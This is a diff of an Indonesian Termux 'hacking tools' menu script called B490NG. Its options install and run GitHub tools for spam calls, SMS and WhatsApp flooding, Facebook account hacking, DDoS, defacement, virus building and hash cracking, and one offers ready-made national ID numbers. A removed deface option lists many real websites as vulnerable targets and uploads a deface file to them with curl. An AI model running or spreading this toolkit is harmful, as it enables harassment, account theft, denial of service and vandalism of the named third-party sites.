@@ -17,30 +17,23 @@ blue="\033[1;34m"
 cyan="\033[1;36m"
 red="\033[1;31m"
 
+figlet *Assalamualaikum gan |lolcat
+figlet Selamat Datang Di Tools Kami* |lolcat
 toilet -f standard -F gay "Mr_Boy"
-echo $blue "[=]Selamat Datang Di Tools B490NG"
-echo $blue "[=]Semoga Anda Bisa Meretas Apa Yg Anda Ingin Retas"
-echo $blue "[=]Jika Ada Kesalahan Dlm Menginstall Tools Ini Anda Bisa Ketik No99 Di reques"
-echo $c"[+]==========================================[+] ${endc}";
-echo $c"[+]             ○    im hack you             [+] ${endc}";
-echo $c"[+]         ● / | \ ●                        [+] ${endc}";
-echo $c"[+]        ● /  ↓  \ ●                       [+] ${endc}";
-echo $c"[+]         |  | |  |                        [+] ${endc}";
-echo $c"[+]            | |                           [+] ${endc}";
-echo $c"[+]           _| |_                          [+] ${endc}";
-echo $c"[+]==========================================[+] ${endc}";
-echo   "[+]==========================================[+]      " |lolcat
-echo   "[+] Team     : B490NG_TIM $white                   [+]      " |lolcat
-echo   "[+] Author   : Mr.βoy $white                       [+]      " |lolcat
-echo   "[+] Youtube  : MR_βOY $white                       [+]      " |lolcat
-echo   "[+]==========================================[+]      " |lolcat
-echo   "[+] member   : ~ [Mr.Dinata]   ~ [*MR.¢rtz*] [+]      " |lolcat
-echo   "[+]          : ~ [Mr.¿V!GuR@?] ~ [nama kamu] [+]      " |lolcat
-echo   "[+]          : ~ [Lucifer😂]   ~ [nama kamu] [+]      " |lolcat
-echo   "[+]          : ~ [nama kamu]   ~ [nama kamu] [+]      " |lolcat
-echo   "[+]          : ~ [nama kamu]   ~ [nama kamu] [+]      " |lolcat
-echo   "[+]          : ~ [nama kamu]   ~ [nama kamu] [+]      " |lolcat
-echo   "[+]==========================================[+]      " |lolcat
+echo $c      "[===============================] ${endc}";
+echo $c      "[             ○    im hack you  ] ${endc}";
+echo $c      "[         ● / | \ ●             ] ${endc}";
+echo $c      "[        ● /  ↓  \ ●            ] ${endc}";
+echo $c      "[         |  | |  |             ] ${endc}";
+echo $c      "[            | |                ] ${endc}";
+echo $c      "[           _| |_               ] ${endc}";
+echo $c      "[===============================] ${endc}";
+echo   "+===========================================+" |lolcat
+echo   "+ Team     : B490NG_TIM $white              + " |lolcat
+echo   "+ Author   : Mr.βoy $white                  + " |lolcat
+echo   "+ Youtube  : MR_βOY $white                  + " |lolcat
+echo   "+===========================================+" |lolcat
+
 echo $r"•••••••••••••••••••••••••••••••••••••••••••••${endc}";
 echo   "##### Kumpulan Tools Terbaru 2019-2020! #####" |lolcat
 echo $r"•••••••••••••••••••••••••••••••••••••••••••••${endc}";
@@ -61,145 +54,118 @@ exit
 lagi=1
 while [ $lagi -lt 6 ];
 do
-
+sleep 1
 echo ""
 echo  "=========================================" |lolcat
-echo  $g "1.  Naik Kereta Api                [+] ÷${endc}";
+echo  $r "1.  Naik Kereta Api                    ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "2.  Profil Guard Facebook          [+] ÷${endc}";
+echo  $g "2.  Profil Guard Facebook              ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "3.  Clone Yahoo                    [+] ÷${endc}";
+echo  $c "3.  Clone Yahoo                        ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "4.  Spam Call                      [+] ÷${endc}";
+echo  $r "4.  Spam Call                          ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "5.  Spam Email                     [+] ÷${endc}";
+echo  $g "5.  Spam Email                         ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "6.  Spam Sms                       [+] ÷${endc}";
+echo  $c "6.  Spam Sms                           ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "7.  Hack FB [MBF]                  [+] ÷${endc}";
+echo  $r "7.  Hack FB [MBF]                      ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "8.  Kode Unik Facebook             [+] ÷${endc}";
+echo  $g "8.  Kode Unik Facebook                 ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "9.  Menampilkan Informasi Sistem Hp[+] ÷${endc}";
+echo  $c "9.  Menampilkan Informasi Sistem Hp    ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "10. Denger/Download Lagu Youtube   [+] ÷${endc}";
+echo  $r "10. Denger/Download Lagu Youtube       ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "11. Hack Wifi (Root)               [+] ÷${endc}";
+echo  $g "11. Hack Wifi (Root)                   ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "12. Browsing                       [+] ÷${endc}";
+echo  $c "12. Browsing                           ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "13. Tutorial NgePrank              [+] ÷${endc}";
+echo  $r "13. Tutorial NgePrank                  ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "14. Lacak Lokasi IP                [+] ÷${endc}";
+echo  $g "14. Lacak Lokasi IP                    ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "15. Ddos Evil Url                  [+] ÷${endc}";
+echo  $c "15. Ddos Evil Url                      ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "16. Membuat Script Deface          [+] ÷${endc}";
+echo  $g "16. Membuat Script Deface              ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "17. Auto React Facebook            [+] ÷${endc}";
+echo  $c "17. Auto React Facebook                ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "18. Tampilan Matrix                [+] ÷${endc}";
+echo  $r "18. Tampilan Matrix                    ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "19. Crack Password Hash            [+] ÷${endc}";
+echo  $g "19. Crack Password Hash                ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "20. Membuat Sistem Login Termux    [+] ÷${endc}";
+echo  $c "20. Membuat Sistem Login Termux        ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "21. Munculin Button Kanan&Kiri     [+] ÷${endc}";
+echo  $r "21. Munculin Button Kanan&Kiri         ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "22. Nuyul Shortlink                [+] ÷${endc}";
+echo  $g "22. Nuyul Shortlink                    ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "23. Fake Mail                      [+] ÷${endc}";
+echo  $c "23. Fake Mail                          ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "24. Hack FB [Dark-FB]              [+] ÷${endc}";
+echo  $r "24. Hack FB [Dark-FB]                  ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "25. Membuat Wordlist               [+] ÷${endc}";
+echo  $g "25. Membuat Wordlist                   ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "26. BAJINGANv6                     [+] ÷${endc}";
+echo  $c "26. BAJINGANv6                         ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "27. TUANB4DUTv4                    [+] ÷${endc}";
+echo  $r "27. TUANB4DUTv4                        ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "28. NIK dan KK siap pakai          [+] ÷${endc}";
+echo  $g "28. NIK dan KK siap pakai              ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "29. Santet Online                  [+] ÷${endc}";
+echo  $c "29. Santet Online                      ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "30. Metasploit                     [+] ÷${endc}";
+echo  $r "30. Metasploit                         ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "31. Ngubah Text ke Kode Binary     [+] ÷${endc}";
+echo  $g "31. Ngubah Text ke Kode Binary         ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "33. SQLmap                         [+] ÷${endc}";
+echo  $r "33. SQLmap                             ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "34. Jadwal Sholat                  [+] ÷${endc}";
+echo  $g "34. Jadwal Sholat                      ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "35. Tools OSIF                     [+] ÷${endc}";
+echo  $c "35. Tools OSIF                         ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "36. Spotify Checker                [+] ÷${endc}";
+echo  $r "36. Spotify Checker                    ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "37. Spam Whatsapp                  [+] ÷${endc}";
+echo  $g "37. Spam Whatsapp                      ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "38. Bermain Moon Buggy             [+] ÷${endc}";
+echo  $c "38. Bermain Moon Buggy                 ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "39. DDOS ATTACK                    [+] ÷${endc}";
+echo  $r "39. DDOS ATTACK                        ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "40. Enkripsi File Bash             [+] ÷${endc}";
+echo  $g "40. Enkripsi File Bash                 ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "41. Fake Name Generator            [+] ÷${endc}";
+echo  $c "41. Fake Name Generator                ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "42. Sms Gratis                     [+] ÷${endc}";
+echo  $r "42. Sms Gratis                         ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "43. Spam Call [Free]               [+] ÷${endc}";
+echo  $g "43. Spam Call [Free]                   ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "44. Hacking FB Tools [Auto MBF]    [+] ÷${endc}";
+echo  $c "44. Hacking FB Tools [Auto MBF]        ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "45. Kalkulator                     [+] ÷${endc}";
+echo  $r "45. Kalkulator                         ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "46. Bikin Virus [Vbug]             [+] ÷${endc}";
+echo  $g "46. Bikin Virus [Vbug]                 ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "47. Tools Decrypt MD5,SHA1&SHA2    [+] ÷${endc}";
+echo  $c "47. Tools Decrypt MD5,SHA1&SHA2        ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "48. Fake Root Termux               [+] ÷${endc}";
+echo  $r "48. Fake Root Termux                   ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "49. Tools Bot Instagram            [+] ÷${endc}";
+echo  $g "49. Tools Bot Instagram                ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "50. spamboy                        [+] ÷${endc}";
+echo  $c "50. spamboy                            ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "51. AOXdeface                      [+] ÷${endc}";
+echo  $r "51. AOXdeface                          ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "52. hackboy                        [+] ÷${endc}";
+echo  $g "00. Exit                               ÷${endc}";
 echo  "=========================================" |lolcat
-echo  $g "53. hack ig                        [+] ÷${endc}";
-echo  "=========================================" |lolcat
-echo  $g "54. tembak kuota                   [+] ÷${endc}";
-echo  "=========================================" |lolcat
-echo  $g "55. Deface                         [+] ÷${endc}";
-echo  "=========================================" |lolcat
-echo  $g "00. Exit                           [+] ÷${endc}";
-echo  "=========================================" |lolcat
-echo  $g ""
+echo ""
 echo  "╭─B490NG" |lolcat
 read -p "╰─#" pil;
 
-
-#install B490NG
-
-case $pil in
-99)pkg update && pkg upgrade
-pkg install lolcat
-pkg install toilet
-pkg install figlet
-pkg install python2
-pkg install git
-clear
-toilet -f standar -F gay "SELESAI"
-git clone https://github.com/rayadinata765/B490NGv2
-mv B490NGv2 $HOME
-cd $HOME/ B490NGv2
-chmod +x B490NG.sh
-sh B490NG.sh
-
-;;
-
 #Kereta
 
+case $pil in
 1) apt updat
 clear
 toilet -f standard -F gay "Mr_Boy"
@@ -219,7 +185,7 @@ pkg install git
 pkg install php
 git clone https://github.com/Al2VyN/FB-Guard.git
 mv FB-Guard.git $HOME
-cd $HOME/ FB-Guard
+cd $HOME/FB-Guard
 chmod +x FB-Guard
 php guard.php
 clear
@@ -237,7 +203,7 @@ pkg install python2
 pip install request
 git clone https://github.com/wahyuandhika/YahooCloning
 mv YahooCloning $HOME
-cd $HOME/ YahooCloning
+cd $HOME/YahooCloning
 chmod +x cloning.py
 python2 cloning.py
 clear
@@ -254,7 +220,7 @@ pkg install git
 pkg install php
 git clone https://github.com/Aditya021/SpamCall
 mv SpamCall $HOME
-cd $HOME/ SpamCall
+cd $HOME/SpamCall
 chmod +x SpamCall.php
 php SpamCall.php
 clear
@@ -555,16 +521,15 @@ python2 fmail.py
 24) apt update
 clear
 toilet -f standard -F gay "Mr_Boy"
-pkg install curl
-pkg install php
-pkg install lolcat
-pkg install git 
+pkg install git
 pkg install python2
-git clone https://github.com/Zxulme/DarkFbVip1
 pip2 install requests
-pip2 install mechanize 
-cd DarkFbVip1
-python2 DarkFbVip1.py
+pip2 install mechanize
+git clone https://github.com/rezadkim/dark-fb
+mv dark-fb $HOME
+cd $HOME/dark-fb
+chmod +x dark.py
+python2 dark.py
 
 ;;
 
@@ -615,8 +580,8 @@ pip2 install lolcat
 git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv4
 mv TOOLSINSTALLERv4 $HOME
 cd $HOME/TOOLSINSTALLERv4
-chmod 777 TUANB4DUT.sh
-./TUANB4DUT.sh
+chmod 777 TUANB4DUT..sh
+./TUANB4DUT..sh
 
 ;;
 
@@ -968,130 +933,6 @@ chmod +x aox.py
 python2 aox.py
 clear
 toilet -f standard -F gay "Mr_Boy"
-
-;;
-
-#hackboy
-
-52)pkg update && pkg upgrade
-clear
-toilet -f standard -F gay "Mr_Boy"
-pkg install python2
-pkg install git
-git clone https://github.com/rayadinata765/hackboy
-mv hackboy $HOME
-cd $HOME/ hackboy
-chmod +x hackboy.sh
-sh hackboy.sh
-
-;;
-
-#Brutesploit
-
-53)apt update && apt upgrade -y
-clear
-toilet -f standard -F gay "Mr_Boy"
-pkg install python
-git clone https://github.com/Screetsec/BruteSploit
-mv BruteSploit $HOME
-cd $HOME/ BruteSploit
-chmod +x Brutesploit.sh
-./Brutesploit.sh
-
-;;
-
-#semut
-
-54)apt update && apt upgrade
-clear
-toilet -f standard -F gay "Mr_Boy"
-pkg install python
-pkg install git
-git clone https://github.com//joss24242/semut
-mv semut $HOME
-cd $HOME/ semut
-chmod +x dor.py
-python dor.py
-
-;;
-
-#Deface
-
-55)clear
-echo "\033[34;1m"
-cowsay -f kiss.cow "Mr_Boy" | lolcat
-figlet -f slant Mr_Boy
-echo "\033[37;1m"
-echo "Masukan Web target"
-echo "Contoh Web Target vuln"
-echo "  http://bestilling.udir.no/"
-echo "  http://560560.ru/"
-echo "  http://myownemailer.com/"
-echo "  http://Zoocentral.co.za/"
-echo "  http://50-50-50.ru/"
-echo "  http://tirupurjobs.net/"
-echo "  http://Matrimony.co.za/"
-echo "  http://Bheh.co.za/"
-echo "  http://mestern.co.za/"
-echo "  http://megro.co.za/"
-echo "  http://bitpc.co.za/"
-echo "  http://butterflowers.co.za/"
-echo "  http://beeit.co.za/"
-echo "  http://esfml.com/"
-echo "  http://bee-it.co.za/"
-echo "  http://mc3qs.com/"
-echo "  http://marjoriebresler.com/"
-echo "  http://naturaleyeimages.com/"
-echo "  http://my-resume.biz/"
-echo "  http://mpark.co.za/"
-echo "  http://montdestin.com/"
-echo "  http://africa-one.co.za/"
-echo "  http://ads247.co.za/"
-echo "  http://accelerate-kids.co.za/"
-echo "  http://8x8.co.za/"
-echo "  http://myownemailer.com/"
-echo "  http://Zoocentral.co.za/"
-echo "  http://50-50-50.ru/"
-echo "  http://tirupurjobs.net/"
-echo "  http://mestern.co.za/"
-echo "  http://megro.co.za/"
-echo "  http://bitpc.co.za/"
-echo "  http://butterflowers.co.za/"
-echo "  http://beeit.co.za/"
-echo "  http://esfml.com/"
-echo "  http://bee-it.co.za/"
-echo "  http://mc3qs.com/"
-echo "  http://marjoriebresler.com/"
-echo "  http://naturaleyeimages.com/"
-echo "  http://my-resume.biz/"
-echo "  http://mpark.co.za/"
-echo "  http://montdestin.com/"
-echo "  http://africa-one.co.za/"
-echo "  http://ads247.co.za/"
-echo "  http://accelerate-kids.co.za/"
-echo "  http://8x8.co.za/"
-echo "  http://aaglcapetown2013.org.za/"
-echo "  http://allpaint.co.za/"
-echo "  http://andrewswebcorner.co.za/"
-echo "  http://applebyguesthouse.com/"
-echo "  http://atlanticphysio.co.za/"
-echo "  http://page31.co.za/"
-echo "  http://vaigaidigitals.com/"
-echo "  http://systemshouse.co.za/"
-echo "  http://www.studentsonline.co.za/"
-echo "  http://lucaniphysio.co.za/"
-echo "  http://www.onboardpublications.co.za/"
-echo "  http://www.oilandclay.co.za/"
-echo "  http://www.aquafitness.za.net/"
-echo "  http://www.helderbergit.co.za/"
-echo "  http://www.pipelinetape.co.za/"
-echo "  http://www.drcrsaexpress.co.za/"
-read -p "[Mr_Boy]>" target
-echo "Masukan Nama script kalian 'contoh [hasilsc.html]"
-echo "yang ada di Luar Folder Ruang Penyimpanan"
-read -p "[Mr_Boy]>" script
-curl -T /storage/emulated/0/$script $target
-echo "\033[33;1m"
 
 ;;
 
